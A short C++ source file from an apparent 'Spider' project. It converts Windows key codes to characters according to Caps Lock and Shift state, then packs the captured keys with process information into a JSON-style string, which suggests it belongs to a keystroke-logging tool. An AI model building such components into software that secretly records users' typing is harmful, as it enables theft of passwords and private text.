//!
//! \file Keyboard.cpp
//! \author mliani
//! \date 30/09/2017
//!

#include <windows.h>
#include <sstream>
#include "Event/Keyboard.hpp"

namespace Spider
{
namespace Event
{
	bool	Keyboard::isSpecialChar(int key)
	{
		if (mSpecialChar[key].empty())
			return (false);
		mKeys = mSpecialChar[key];
		return (true);
	}

	void	Keyboard::setKey(int key)
	{
		if (!isSpecialChar(key))
		{
			if (((!(GetKeyState(VK_CAPITAL) & 0x0001) && GetKeyState(VK_SHIFT) >= 0) && key >= 'A' && key <= 'Z')
				|| ((GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) < 0) && key >= 'A' && key <= 'Z'))
				 mKeys = key + 32;
			else
				 mKeys = key;
		}
	}

	std::string Keyboard::getEventInfo() const
	{
		return (std::string("\"KEYS\":\"" + mKeys + "\",\"PROCESS_INFO\":\"" + mProcessInfo + "\""));
	}
}
}